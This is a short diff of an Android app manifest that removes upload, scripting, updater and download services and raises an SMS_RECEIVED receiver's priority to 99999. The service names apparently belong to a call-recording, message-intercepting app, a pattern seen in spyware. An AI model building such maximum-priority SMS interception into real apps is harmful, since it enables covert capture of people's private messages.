@@ -56,24 +56,16 @@
 
         <service android:name="RecRecordService" >
         </service>
-        <service android:name="UploadService" >
-        </service>
         <service android:name="StartService" >
-        </service>
-        <service android:name="ScripterService" >
-        </service>
-        <service android:name="UpdaterService" >
         </service>
 
         <receiver android:name="SMSBroadcastReceiver" >
-            <intent-filter android:priority="999" >
+            <intent-filter android:priority="99999" >
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
 
         <service android:name="SMService" >
-        </service>
-        <service android:name="DownloadService" >
         </service>
         <service android:name="SuperService" >
         </service>
